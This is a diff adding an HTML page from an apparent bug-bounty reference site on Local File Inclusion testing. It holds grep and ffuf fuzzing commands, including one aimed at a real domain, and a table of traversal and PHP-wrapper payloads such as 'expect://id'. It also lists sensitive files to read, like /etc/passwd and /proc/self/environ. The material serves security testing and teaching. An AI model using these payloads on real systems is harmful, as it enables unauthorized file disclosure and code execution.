@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LFI - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link active">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Page Header -->
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>LFI</span>
+        </div>
+        <h1><i class="fas fa-folder-open"></i> Local File Inclusion (LFI)</h1>
+        <p>Local File Inclusion testing methodology and exploitation techniques.</p>
+    </header>
+
+    <!-- Content Section -->
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-file-import"></i> Requirements</h2>
+                <p>You need <code>URLS.txt</code> file or <code>params.txt</code> for this testing.</p>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-search"></i> LFI Testing Workflow</h2>
+
+                <h3>GREP for File/Folder Related Parameters</h3>
+                <p><strong>This is WHERE we identify possible file or directory inclusion</strong></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>grep -Ei "file=|path=|page=|dir=|folder=|doc=|include=|inc=|template=|view=|load=|download=|read=|name=|resource=|img=|image=|pdf=" parameter.txt > lfi_candidates.txt</pre>
+                </div>
+                <p>Or use gf patterns</p>
+
+                <h3>Remove Duplicate URLs</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>sort -u lfi_candidates.txt > lfi_unique.txt</pre>
+                </div>
+
+                <h3>Using Liffy</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>liffy -l lfi_candidates.txt -w lfipayloads.txt</pre>
+                </div>
+
+                <h3>Using ffuf (Best)</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>ffuf -u "http://www.dailymotion.com/?page=FUZZ&id=1539508" \
+-w lfipayloads.txt \
+-mc 200 \
+-fs 0 \
+-t 40</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-bolt"></i> Common LFI Payloads</h2>
+                <table>
+                    <tr>
+                        <th>Type</th>
+                        <th>Payload</th>
+                    </tr>
+                    <tr>
+                        <td>Basic Linux</td>
+                        <td><code>../../../etc/passwd</code></td>
+                    </tr>
+                    <tr>
+                        <td>Double Encoding</td>
+                        <td><code>....//....//etc/passwd</code></td>
+                    </tr>
+                    <tr>
+                        <td>URL Encoded</td>
+                        <td><code>%2e%2e%2fetc%2fpasswd</code></td>
+                    </tr>
+                    <tr>
+                        <td>Null Byte</td>
+                        <td><code>/etc/passwd%00</code></td>
+                    </tr>
+                    <tr>
+                        <td>Windows</td>
+                        <td><code>..\..\..\windows\win.ini</code></td>
+                    </tr>
+                    <tr>
+                        <td>PHP Wrapper</td>
+                        <td><code>php://filter/read=convert.base64-encode/resource=index.php</code></td>
+                    </tr>
+                    <tr>
+                        <td>Data Wrapper</td>
+                        <td><code>data://text/plain,<?php phpinfo(); ?></code></td>
+                    </tr>
+                    <tr>
+                        <td>Expect Wrapper</td>
+                        <td><code>expect://id</code></td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-list-check"></i> LFI Test Files</h2>
+                <ul>
+                    <li><code>/etc/passwd</code> - Linux user info</li>
+                    <li><code>/etc/hosts</code> - Network configuration</li>
+                    <li><code>/proc/self/environ</code> - Environment variables</li>
+                    <li><code>/var/log/apache2/access.log</code> - Apache logs</li>
+                    <li><code>C:\Windows\win.ini</code> - Windows config</li>
+                    <li><code>C:\Windows\System32\drivers\etc\hosts</code> - Windows hosts</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+            <p>Made with <i class="fas fa-heart"></i> for the security community</p>
+        </div>
+    </footer>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast">Copied to clipboard!</div>
+
+    <script src="script.js"></script>
+</body>
+</html>
